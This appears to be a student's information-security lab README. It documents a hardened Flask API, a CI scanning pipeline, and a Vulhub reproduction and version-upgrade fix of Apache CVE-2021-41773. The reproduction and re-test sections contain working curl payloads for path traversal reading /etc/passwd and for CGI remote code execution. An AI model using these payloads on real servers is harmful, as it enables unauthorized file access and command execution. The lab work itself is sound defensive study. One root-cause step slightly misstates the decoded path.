# Secure REST API Lab — CI/CD Security Pipeline + Real CVE Analysis

**Student:** Li Zetao (李泽涛)
**HDU ID:** 23320332
**Course:** Information Security — Lab Work 1

---

## 1. Project Description

A secure REST API built with **Python / Flask** that demonstrates production-grade
authentication, input protection, and automated security scanning in CI/CD.

### Tech Stack

| Component | Choice |
|---|---|
| Language | Python 3.13 |
| Web framework | Flask 3.0 |
| Database | SQLite (via `sqlite3`, parameterized queries) |
| Auth token | JWT (PyJWT, HS256) |
| Password hashing | bcrypt |
| CI/CD | GitHub Actions |
| SAST | Bandit |
| SCA | pip-audit |

### Endpoints

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/` | No | Service info / health check |
| `POST` | `/auth/login` | No | Authenticate with username + password, receive JWT |
| `GET` | `/api/data` | **Yes** | List all posts (escaped output) |
| `POST` | `/api/posts` | **Yes** | Create a new post |
| `GET` | `/api/profile` | **Yes** | Show current authenticated user |

### Quick Start

```bash
pip install -r requirements.txt
python app.py
# API runs at http://127.0.0.1:5000
```

### Example Requests

```bash
# 1. Login (demo user: alice / SecurePass123!)
curl -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"SecurePass123!"}'
# -> {"token":"eyJ...","token_type":"Bearer"}

# 2. Access protected data
curl http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer <token>"

# 3. Create a post
curl -X POST http://127.0.0.1:5000/api/posts \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"title":"My post","content":"Hello secure world"}'
```

---

## 2. Implemented Security Measures

### 2.1 Protection against SQL Injection

All database queries use **parameterized statements** (sqlite3 `?` placeholders).
User input is *never* concatenated into SQL strings.

```python
# SAFE — parameterized
db.execute("SELECT * FROM users WHERE username = ?", (username,))
db.execute("INSERT INTO posts (title, content, author_id) VALUES (?, ?, ?)",
           (title, content, g.user["id"]))
```

A SQL injection attempt such as `username = "alice' -- "` is treated as a literal
string and simply returns "invalid credentials" (HTTP 401).

### 2.2 Protection against XSS

All user-controlled data returned in API responses is HTML-escaped using
`markupsafe.escape()` before being serialized to JSON.

```python
"title": str(escape(r["title"])),
"content": str(escape(r["content"])),
```

A post containing `<script>alert("xss")</script>` is stored but returned as
`&lt;script&gt;alert(&#34;xss&#34;)&lt;/script&gt;`, preventing script execution.

### 2.3 Broken Authentication Protection

- **JWT issuance:** On successful login, a signed JWT (HS256) is returned with a
  1-hour expiry.
- **Middleware:** Every protected endpoint is decorated with `@token_required`,
  which:
  - Extracts the Bearer token from the `Authorization` header.
  - Verifies the signature and expiry with `jwt.decode()`.
  - Looks up the user in the database.
  - Rejects missing, expired, or tampered tokens with HTTP 401.

```python
@app.route("/api/data")
@token_required
def list_posts(): ...
```

### 2.4 Password Hashing

Passwords are hashed with **bcrypt** (with automatic salting) and never stored
in plaintext. Verification uses `bcrypt.checkpw()` (constant-time comparison).

```python
hashed = bcrypt.hashpw(b"SecurePass123!", bcrypt.gensalt())
# stored in DB as password_hash
bcrypt.checkpw(password.encode(), user["password_hash"].encode())
```

---

## 3. CI/CD Security Pipeline (GitHub Actions)

The pipeline (`.github/workflows/ci.yml`) runs automatically on every push and
pull request. It performs:

- **SAST (Bandit):** static analysis of `app.py` for common security issues.
- **SCA (pip-audit):** scans installed dependencies for known CVEs.

> **Screenshot:** Bandit and pip-audit results from the GitHub Actions tab.
> The first run failed because pip-audit detected vulnerabilities in Flask 3.0.3
> and PyJWT 2.9.0; after upgrading to Flask 3.1.3+ and PyJWT 2.15.0+, the
> second run passed successfully.
>
> Last successful pipeline: https://github.com/mycbdys/hdu-is-lab1-secure-api/actions/runs/39251020941

---

## 4. Selected Vulnerability: CVE-2021-41773

- **CVE ID:** CVE-2021-41773
- **Affected software:** Apache HTTP Server 2.4.49
- **Description:** A path normalization flaw in Apache 2.4.49 allows remote attackers
  to map URLs to files outside the expected document root via path traversal
  sequences using URL-encoded dots (`%2e`). If CGI is enabled on aliased paths,
  this can escalate to remote code execution.

### 4.1 Reproduction Steps

**Environment:** Vulhub `httpd/CVE-2021-41773`, Apache 2.4.49 with CGI enabled,
accessible at `http://localhost:8081`.

```bash
# 1. Start the vulnerable environment
cd vulhub/httpd/CVE-2021-41773
docker compose up -d

# 2. Normal request — confirms the server is up
curl http://localhost:8081/
# -> <html><body><h1>It works!</h1></body></html>

# 3. Path traversal — read /etc/passwd outside the document root
curl --path-as-is http://localhost:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# -> root:x:0:0:root:/root:/bin/bash
#    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
#    ... (full /etc/passwd contents disclosed)

# 4. Remote code execution via CGI
curl --path-as-is --data "echo;id" http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
# -> uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

The attack works because `/icons/` is an existing aliased directory, and the
`/.%2e/` sequence bypasses the path-normalization check: Apache decodes `%2e`
to `.` *after* the traversal check, so `/.%2e/` collapses to `/../` and escapes
the document root.

### 4.2 Root Cause Analysis

In Apache HTTP Server 2.4.49, a refactoring of the path-normalization logic
(introduced to resolve a different edge case) changed the order of operations:

1. The server checked for `..` segments **before** URL-decoding percent-encoded
   characters.
2. The attacker supplies `/.%2e/` — at check time this looks like a single
   dot (`.`) segment, which is harmless.
3. After the check, `%2e` is decoded to `.`, turning `/.%2e/` into `/./` and
   when chained: `/.%2e/%2e%2e/...` effectively becomes `/../../etc/passwd`.

This is a **logic error** in input handling: the traversal check was performed
on the wrong representation of the path (pre-decoding instead of post-decoding).
The vulnerability is exploitable when:
- An aliased directory (like `/icons/`) exists, and
- Files outside the web root are not protected by `Require all denied`.

### 4.3 Applied Fix

**Solution:** Upgrade Apache HTTP Server from 2.4.49 to **2.4.51**.

The original fix (2.4.50) corrected the order of path normalization, but a
bypass (CVE-2021-42013) was found that used double-encoded sequences
(`.%%32%65/`). Version 2.4.51 fully resolves both variants.

Changed in `Dockerfile`:
```dockerfile
# BEFORE (vulnerable):
FROM vulhub/httpd:2.4.49

# AFTER (fixed):
FROM httpd:2.4.51
```

All other configuration (CGI modules enabled, `Require all granted` on `/`)
remains identical, proving that the fix is in the software version, not in
hardening the config.

### 4.4 Proof of Fix

After rebuilding with `httpd:2.4.51` and restarting:

```bash
# Confirm the patched version
docker exec <container> /usr/local/apache2/bin/httpd -v
# -> Server version: Apache/2.4.51 (Unix)

# Repeat the exact same path traversal attack
curl --path-as-is http://localhost:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# -> HTTP 400 Bad Request  (attack rejected, no /etc/passwd leaked)

# Repeat the CGI RCE attack
curl --path-as-is --data "echo;id" http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
# -> HTTP 400 Bad Request  (no code execution)

# Regression: normal functionality still works
curl http://localhost:8081/
# -> HTTP 200, <html><body><h1>It works!</h1></body></html>

curl http://localhost:8081/icons/
# -> HTTP 200 (directory listing works normally)
```

Both attack vectors now return **400 Bad Request**, while normal web serving
returns **200 OK** — the vulnerability is closed and functionality is intact.

> Fix files are in the `cve-fix/` directory: `Dockerfile.vulnerable` (original),
> `Dockerfile.fixed` (patched), and `docker-compose.yml`.

---

## 5. Repository Structure

```
.
├── app.py                  # Flask application
├── requirements.txt        # Python dependencies
├── .github/workflows/ci.yml # GitHub Actions CI/CD
├── cve-fix/                # CVE-2021-41773 fix files
│   ├── Dockerfile.vulnerable  # original (Apache 2.4.49)
│   ├── Dockerfile.fixed       # patched (Apache 2.4.51)
│   └── docker-compose.yml
├── users.db                # SQLite database (auto-created, gitignored)
└── README.md
```
